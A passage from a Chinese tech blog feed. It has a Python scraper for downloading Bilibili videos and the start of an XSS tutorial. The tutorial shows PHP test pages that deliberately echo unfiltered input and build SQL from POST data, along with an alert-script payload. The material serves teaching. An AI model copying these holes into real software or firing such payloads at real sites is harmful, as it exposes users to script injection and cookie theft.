class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在合并 &quot;</span> + video_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;完成合并 &quot;</span> + video_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">merge_data(video_data[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010405722.png" alt="image-20210322010405722"></p><p>合并后视频正常播放，有声有色。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010551889.png" alt="image-20210322010551889"></p><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/3/21 16:11</span></span><br><span class="line"><span class="comment"># @Author : wawyw</span></span><br><span class="line"><span class="comment"># @File : bilibili_video.py</span></span><br><span class="line"><span class="comment"># @Software : PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在合并 &quot;</span> + video_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;完成合并 &quot;</span> + video_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;输入bilibili视频对应的链接即可下载：&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010945179.png" alt="image-20210322010945179"></p><blockquote><p>虽说这次是将白嫖进行到底了，但B站UP主们创作视频确实不易，我们也从中收获很多，能三连还是要多多支持下~</p></blockquote><hr><h1 id="打包成exe"><a href="#打包成exe" class="headerlink" title="打包成exe"></a>打包成exe</h1><p>首先我们要先安装Pyinstaller，直接在cmd使用pip命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller </span><br></pre></td></tr></table></figure><p>然后，把ffmpeg和py文件放置到同一文件夹下。</p><p>因为ffmpeg是要一起打包的，需要对代码中的相应目录做小幅修改。修改后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp3&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp3&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp4&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在合并 &quot;</span> + video_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;ffmpeg/bin/&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;%s.mp4&quot;</span>%video_name,<span class="string">&quot;../../%s.mp4&quot;</span>%video_name)</span><br><span class="line">    print(<span class="string">&quot;完成合并 &quot;</span> + video_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;输入bilibili视频对应的链接即可下载：\n&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>修改好后，cmd切换到我们刚刚放文件的目录，执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pyinstall -F -i bilibili.ico bilibili_video_download.py</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210417235918679.png" alt="image-20210417235918679"></p><p>（这里<code>-i bilibili.ico</code>是对程序的图标进行设置，为可选项）</p><p>执行完毕会发现当前目录多了几个文件夹，打开其中名为dist的文件夹，里面生成了一个名为<code>bilibili_video_download</code>的exe应用程序，并且图标也是我们设置的图案。（这里要把exe文件移动到上一级目录，即ffmpeg的同级目录）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418000736927.png" alt="image-20210418000736927"></p><p>点击运行exe应用程序，输入视频URL即可下载。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001107366.png" alt="image-20210418001107366"></p><p>下载完毕！</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001228931.png" alt="image-20210418001228931"></p><p>所有相关资源已放在下面的链接中，需要的朋友可以自取。（下载后解压此压缩包，运行<code>bilibili_video_download.exe</code>并输入视频对应链接即可完成视频下载 ）</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg">https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg</a><br>提取码：1234<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞学习</title>
      <link href="posts/54823.html"/>
      <url>posts/54823.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>可提供XSS练习的靶场</p><p>在线：</p><p><a href="https://xss.haozi.me/">https://xss.haozi.me/</a></p><p><a href="https://xssaq.com/yx/index.php">https://xssaq.com/yx/index.php</a></p><p>需下载安装：</p><p><a href="https://dvwa.co.uk/">DVWA</a></p><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a></p></blockquote><h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>跨站脚本(Cross-site Scripting )攻击，攻击者通过网站注入点注入客户端可执行解析的payload（脚本代码），当用户访问网页时，恶意payload自动加载并执行，以达到攻击者目的（窃取cookie、恶意传播、钓鱼欺骗等）。为了避免CSS（层叠样式表）相混淆，通常称它为”XSS”。</p><p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型XSS非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面，在发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。这类攻击手段大多数是用来盗取用户的Cookie信息。</p><p>流程图如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094651918.png"></p><p>测试代码<code>reflected.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;反射型XSS测试&lt;h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;reflected.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $name = $_GET[&#x27;</span>name<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">    echo &quot;Hello! &quot;.$name;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个简单的用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理，再由前端显示。所以这种漏洞数据流向是： 前端–&gt;后端–&gt;前端。很明显，此过程中没有对输入的参数作任何过滤，存在XSS。<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315233801938.png" alt="image-20210315233801938"></p><p>我们可以在输入框或URL中写入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>进行测试，回车后可见xss弹窗。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234322375.png" alt="image-20210315234322375"></p><p>查看网页源代码可以发现，插入进去的js脚本被完完全全的执行了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210315234502018.png" alt="image-20210315234502018"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称为持久型XSS，攻击者将XSS代码发送给了服务器，而服务器没有对这些代码做任何处理就直接存储在了数据库中，当下一个用户访问网站时直接从数据库调用出来传给前端，浏览器解析XSS代码就造成了XSS攻击。常见的攻击点在个人信息、发表文章、留言板等地方。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。</p><p>流程图如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108094756253.png"></p><p>测试代码<code>stored.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;存储型XSS测试&lt;h2&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;border: 1px solid&quot;</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;stored.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        name:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        comments：&lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;发表&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;p&gt;评论区：&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&quot;test&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into comment values (&#x27;<span class="subst">$_POST</span>[name]&#x27;,&#x27;<span 